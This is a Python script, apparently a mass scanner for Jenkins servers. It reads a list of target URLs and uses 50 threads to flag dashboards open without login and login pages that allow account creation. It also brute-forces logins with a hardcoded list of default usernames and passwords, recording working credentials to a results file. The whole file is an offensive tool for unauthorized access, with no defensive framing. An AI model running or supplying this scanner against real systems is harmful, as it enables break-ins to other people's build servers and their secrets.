#!/usr/bin/python3
# -*- coding: utf-8 -*-
#小青蛙呱呱呱
import requests
import urllib.parse
import threading
import queue
import urllib3
import re
urllib3.disable_warnings()
q=queue.Queue()

file=open('website.txt')
for x in file.readlines():
        q.put(x.strip())



def scan():
    while not q.empty():
        url=q.get()

        try:
            proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
            burp0_cookies = {"JSESSIONID.f58f7b71": "node0b4dzotdqvc17f1su45ugrmh711559.node0", "screenResolution": "1920x1080"}
            burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
            res=requests.get(url, headers=burp0_headers, cookies=burp0_cookies)
            if r'Dashboard [Jenkins]' in str(res.text.encode('utf-8')):
                print(url+' 未授权访问')
                with open ('result.txt','a') as f:
                    f.write(url+' 未授权访问'+'\n')
            else:
                url2=url+'/login?from=%2F'
                burp0_cookies = {"JSESSIONID.02e4da3e": "g3sg7dedgml1esolp2bcc78t"}
                burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
                                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                 "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
                                 "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
                res2=requests.get(url2, headers=burp0_headers, cookies=burp0_cookies,proxies=proxies)
                if 'j_username' in str(res2.text.encode('utf-8')):
                    #print('ok')
                    if r'\xe5\x88\x9b\xe5\xbb\xba\xe4\xb8\x80\xe4\xb8\xaa\xe7\x94\xa8\xe6\x88\xb7\xe8\xb4\xa6\xe5\x8f\xb7'in str(res2.text.encode('utf-8')):
                        print(url2+' 可创建账号')
                        with open('result.txt', 'a') as ff:
                            ff.write(url2+' 可创建账号'+ '\n')
                    else:
                        pass
                    url3 = url+'/j_acegi_security_check'
                    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
                                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                     "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                                     "Accept-Encoding": "gzip, deflate", "DNT": "1",
                                     "Referer": url+'/login?from=%2F', "Connection": "close",
                                     "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
                    for admin in ['admin','test','root']:
                        for password in ['admin','password','123456','root']:
                            burp0_data = {"j_username": admin, "j_password": password, "from": "/",
                                          "Submit": urllib.parse.unquote('%E7%99%BB%E5%BD%95')}
                            res3 = requests.post(url3, headers=burp0_headers, data=burp0_data, proxies=proxies,
                                                allow_redirects=False)

                            New_Cookie=res3.headers['Set-Cookie']


                            url4 = url
                            burp0_cookies = {"JSESSIONID.b2cd0296": "node0ezkem89pqto514a6f0mwfe53z305.node0"}
                            burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
                                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                             "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                                             "Accept-Encoding": "gzip, deflate", "DNT": "1",
                                             "Referer": url4+'/login?from=/', "Connection": "close",
                                             "Cookie": New_Cookie,
                                             "Upgrade-Insecure-Requests": "1"}
                            res4=requests.get(url4, headers=burp0_headers)
                            if r'Dashboard [Jenkins]' in str(res4.text.encode('utf-8')):
                                print(url3+'存在弱口令'+admin+':'+password)
                                with open('result.txt', 'a') as fff:
                                    fff.write(url3+'存在弱口令'+admin+':'+password + '\n')

                        else:
                            pass
                else:
                    pass
        except:
            pass

th=[]
th_num=50
lock = threading.Lock()
for x in range(th_num):
        t=threading.Thread(target=scan)
        th.append(t)
for x in range(th_num):
        th[x].start()
for x in range(th_num):
        th[x].join()
